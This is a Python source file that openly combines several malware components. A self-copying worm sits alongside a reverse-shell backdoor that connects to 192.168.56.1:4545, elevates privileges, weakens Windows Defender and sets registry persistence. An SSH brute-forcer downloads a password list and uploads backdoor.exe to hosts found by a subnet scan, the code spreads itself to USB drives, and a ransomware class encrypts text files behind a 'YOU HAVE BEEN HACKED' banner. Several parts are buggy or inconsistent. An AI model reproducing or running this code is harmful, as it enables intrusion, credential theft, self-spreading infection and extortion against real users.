# ----------------------------------------------------------------------------------------------------------------------#
import spwd

# ----------#
import crypt

# ----------#
import requests

# ----------#
import nmap

# ----------#
import paramiko

# ----------#
import os

# ----------#
import socket

# ----------#
import urllib

# ----------#
import sys

# ----------#
import urllib
from urllib.request import urlopen

# ----------#
import time
from time import sleep

# ----------#
import ftplib
from ftplib import FTP

# ----------#
import shutil
from shutil import copy2

# ----------#
import win32api

# ----------#
import netifaces

# ----------#
from threading import Thread

# ----------#
import socket

# ----------#
import subprocess
from subprocess import call
from subprocess import Popen

# ----------#
import tarfile

# ----------#
# ----------------------------------------------------------------------------------------------------------------------#

gws = netifaces.gateways()
gateway = gws["default"][netifaces.AF_INET][0]


class worm:
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path
        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list
        if isinstance(target_dir_list, type(None)):
            self.iteration = 2
        else:
            self.iteration = iteration
        self.own_path = os.path.realpath(__file__)

    def l(self, path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)

        for file in files_in_current_directory:
            absolute_path = os.path.join(path, file)
            print(absolute_path)

            if os.path.isdir(absolute_path):
                self.l(absolute_path)
            else:
                pass

    def n(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, ".xr.py")
            shutil.copyfile(self.own_path, destination)

    def c(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith(".") and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory, ("." + file + str(i)))
                        shutil.copyfile(source, destination)

    def s(self):
        self.l(self.path)
        print(self.target_dir_list)
        self.n()
        self.c()

    if __name__ == "__main__":
        current_directory = os.path.abspath("")
        worm = worm(path=current_directory)
        worm.s()


class Backdoor:
    import socket
    import json
    import subprocess
    import time
    import os
    import threading
    import shutil
    import sys
    import win32com

    ASADMIN = "asadmin"

    if sys.argv[-1] != ASADMIN:
        script = os.path.abspath(sys.argv[0])
        params = " ".join([script] + sys.argv[1:] + [ASADMIN])
        win32com.shell.shell.ShellExecuteEx(
            lpVerb="runas", lpFile=sys.executable, lpParameters=params
        )
        sys.exit(0)
    os.system("powershell.exe -command Add-MpPreference -ExclusionExtension .exe")
    os.system("powershell.exe -command Set-MpPreference -PUAProtection disable")

    def reliable_send(data):
        jsondata = Backdoor.json.dumps(data)
        Backdoor.send(jsondata.encode())

    def reliable_recv():
        data = ""
        while True:
            try:
                data = data + Backdoor.recv(1024).decode().rstrip()
                return Backdoor.json.loads(data)
            except ValueError:
                continue

    def is_admin():
        global admin
        try:
            temp = os.listdir(os.sep.join([os.environ.get("SystemRoot", "C:\windows"), "temp"]))
        except:
            admin = "[!!!]User Privileges!!!"
        else:
            admin = "[+] Admin Privileges!!!"

    def download_file(file_name):
        f = open(file_name, "wb")
        Backdoor.settimeout(1)
        chunk = Backdoor.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = Backdoor.recv(1024)
            except socket.timeout as e:
                break
        Backdoor.settimeout(None)
        f.close()

    def upload_file(file_name):
        f = open(file_name, "rb")
        Backdoor.send(f.read())

    def persist(reg_name, copy_name):
        file_location = os.environ["appdata"] + "\\" + copy_name
        try:
            if not os.path.exists(file_location):
                shutil.copyfile(sys.executable, file_location)
                subprocess.call(
                    "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "
                    + reg_name
                    + ' /t REG_SZ /d "'
                    + file_location
                    + '"',
                    shell=True,
                )
                Backdoor.reliable_send("[+] Created Persistence With Reg Key: " + reg_name)
            else:
                Backdoor.reliable_send("[+] Persistence Already Exists")
        except:
            Backdoor.reliable_send("[+] Error Creating Persistence With The Target Machine")

    def connection():
        while True:
            time.sleep(20)
            try:
                Backdoor.connect(("192.168.56.1", 4545))
                Backdoor.shell()
                Backdoor.close()
                break
            except:
                Backdoor.connection()

    def shell():
        while True:
            command = Backdoor.reliable_recv()
            if command == "quit":
                break
            elif command == "background":
                pass
            elif command == "worm":
                worm.s()
            elif command == "wifi":
                Network.main()
            elif command == "help":
                pass
            elif command == "clear":
                pass
            elif command == "encrypt":
                Ransom.encrypt()
            elif command == "decrypt":
                Ransom.decrypt()
            elif command[:3] == "cd ":
                os.chdir(command[3:])
            elif command[:5] == "check":
                try:
                    Backdoor.is_admin()
                    Backdoor.reliable_send(admin)
                except:
                    Backdoor.reliable_send("Something Went Wrong")
            elif command[:6] == "upload":
                Backdoor.download_file(command[7:])
            elif command[:8] == "download":
                Backdoor.upload_file(command[9:])
            elif command[:11] == "persistence":
                reg_name, copy_name = command[12:].split(" ")
                Backdoor.persist(reg_name, copy_name)
            elif command[:7] == "sendall":
                subprocess.Popen(
                    command[8:],
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                )
            else:
                execute = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                )
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                Backdoor.reliable_send(result)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Backdoor.connection()


class Network:
    import nmap
    import paramiko
    import os
    import socket
    from urllib.request import urlopen
    import urllib
    import time
    from ftplib import FTP
    import ftplib
    from shutil import copy2
    import win32api
    import netifaces
    from threading import Thread

    # ----- -----
    import networking

    # ----- -----

    # ------------------- Logging ----------------------- #
    import coloredlogs, logging

    logger = logging.getLogger(__name__)
    coloredlogs.install(fmt="%(message)s", level="DEBUG", logger=logger)
    # --------------------------------------------------- #
    # gets gateway of the network
    gws = netifaces.gateways()
    gateway = gws["default"][netifaces.AF_INET][0]

    def scan_hosts(port):
        """
        Scans all machines on the same network that
        have the specified port enabled
        Returns:
            IP addresses of hosts
        """
        Network.logger.debug(f"Scanning machines on the same network with port {port} open.")

        Network.logger.debug("Gateway: " + gateway)

        port_scanner = nmap.PortScanner()
        port_scanner.scan(gateway + "/24", arguments="-p" + str(port) + " --open")

        all_hosts = port_scanner.all_hosts()

        Network.logger.debug("Hosts: " + str(all_hosts))
        return all_hosts

    def download_ssh_passwords(filename):
        """
        Downloads most commonly used ssh passwords from a specific url
        Clearly, you can store passwords in a dictionary, but i found this more comfortable

        Args:
            filename - Name to save the file as.
        """

        # TODO:130 This wordlist contains only few passwords. You would need a bigger one for real bruteforcing. \_(OwO)_/

        Network.logger.debug("Downloading passwords...")
        url = "https://raw.githubusercontent.com/Olegatopt/10_million_password_list_top_100000/main/10_million_password_list_top_100000.txt"
        urllib.request.urlretrieve(url, filename)
        Network.logger.debug("Passwords downloaded!")

    def connect_to_ftp(host, username, password):
        # TODO:30 : Finish this function + Add bruteforcing
        try:
            ftp = FTP(host)
            ftp.login(username, password)
        except ftplib.all_errors as error:
            Network.logger.error(error)
            pass

    def connect_to_ssh(host, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            Network.logger.debug("Connecting to: " + host)
            client.connect(host, 22, "root", password)
            Network.logger.debug("Successfully connected!")

            sftp = client.open_sftp()
            sftp.put("backdoor.exe", "destination")  # change this.

            return True
        except socket.error:
            Network.logger.error("Computer is offline or port 22 is closed")
            return False
        except paramiko.ssh_exception.AuthenticationException:
            Network.logger.error("Wrong Password or Username")
            return False
        except paramiko.ssh_exception.SSHException:
            # socket is open, but not SSH service responded
            Network.logger.error("No response from SSH server")
            return False

    def bruteforce_ssh(host, wordlist):
        """
        Calls connect_to_ssh function and
        tries to bruteforce the target server.

        Args:
            wordlist - TXT file with passwords

        """
        # TODO:10 : Bruteforce usernames too
        file = open(wordlist, "r")
        for line in file:
            connection = Network.connect_to_ssh(host, line)
            print(connection)
            time.sleep(5)

    def drivespreading():
        bootfolder = (
            os.path.expanduser("~")
            + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
        )

        while True:
            drives = win32api.GetLogicalDriveStrings()
            drives = drives.split("\000")[:-1]
            print(drives)
            for drive in drives:
                try:
                    if "C:\\" == drive:
                        copy2(__file__, bootfolder)
                    else:
                        copy2(__file__, drive)
                except:
                    pass
            time.sleep(3)

    def start_drive_spreading():
        thread = Thread(target=Network.drivespreading)
        thread.start()

    def main():
        Network.start_drive_spreading()

    if __name__ == "__main__":
        main()


class Ransom:
    import os
    import base64
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.asymmetric import padding
    from cryptography.hazmat.primitives import hashes

    try:
        private_key = rsa.generate_private_key(
            public_exponent=65537, key_size=int(7e4), backend=default_backend()
        )
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        )

        with open("private_key.pem", "wb") as f:
            f.write(private_pem)
        public_key = private_key.public_key()
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        with open("public_key.pem", "wb") as f:
            f.write(public_pem)
        print("\nSuccessfully created Public and Private Key\n")
    except Exception as e:
        print("\nFailure\n")
        print(e)
    files = os.listdir()

    def decrypt(encrypted):
        with open("private_key.pem", "rb") as key_file:
            private_key = Ransom.serialization.load_pem_private_key(
                key_file.read(), password=None, backend=Ransom.default_backend()
            )
            decrypted = private_key.decrypt(
                Ransom.base64.b64decode(encrypted),
                Ransom.padding.OAEP(
                    mgf=Ransom.padding.MGF1(algorithm=Ransom.hashes.SHA256()),
                    algorithm=Ransom.hashes.SHA256(),
                    label=None,
                ),
            )
        return decrypted

    def encrypt(plaintext):
        with open("public_key.pem", "rb") as key_file:
            public_key = Ransom.serialization.load_pem_public_key(
                key_file.read(), backend=Ransom.default_backend()
            )
        encrypted = Ransom.base64.b64encode(
            public_key.encrypt(
                plaintext,
                Ransom.padding.OAEP(
                    mgf=Ransom.padding.MGF1(algorithm=Ransom.hashes.SHA256()),
                    algorithm=Ransom.hashes.SHA256(),
                    label=None,
                ),
            )
        )
        return encrypted

    def encryption():
        for file in Ransom.files:
            if file.endswith(".txt"):
                f = open(file, "rb")
                plaintext = f.read()
                f = open(file, "wb")
                encrypted_txt = Ransom.encrypt(plaintext)
                f.write(encrypted_txt)

    def decryption():
        for file in Ransom.files:
            if file.endswith(".txt"):
                f = open(file, "rb")
                encrypted = f.read()
                f = open(file, "wb")
                decrypted_txt = Ransom.decrypt(encrypted)
                f.write(decrypted_txt)
                print(decrypted_txt)

    skull = """
                        ______
                    .-"      "-.
                    /            \\
                    |              |
                    |,  .-.  .-.  ,|
            /\   | )(__/  \__)( |
            _ \/   |/     /\     \|
            \_\/    (_     ^^     _)   .-==/~\\
        ___/_,__,_\__|IIIIII|__/__)/   /{~}}
        ---,---,---|-\IIIIII/-|---,\'-' {{~}
                    \          /     '-==\}/
                    `--------`
    """
    try:
        print(skull)
        print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
        print("\n YOU HAVE BEEN HACKED \n")
        print(
            "\n PLEASE, DON'T KILL THIS PROCESS, AS YOUR DATA WILL BE LOST"
            + "\033[1m"
            + "FOREVER.\n"
            + "\033[0m"
        )
        print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\n")

        encryption()
        try:
            print(" ************************************ ")
            print("Do you have your decription Key?(Y/N) : ")
            userInput = input()
            while userInput.lower() == "N":
                print("Please contact to know your key.")
                userInput = input()
            decryption()
        except Exception as e:
            print(f"There has been an error! (DO NOT ABUSE OF MY CLEMENCY): {e}")
            print("")
    except Exception as e:
        print(f"Encryption Failed \n({e})")


while True:
    Backdoor.shell()
    input = input()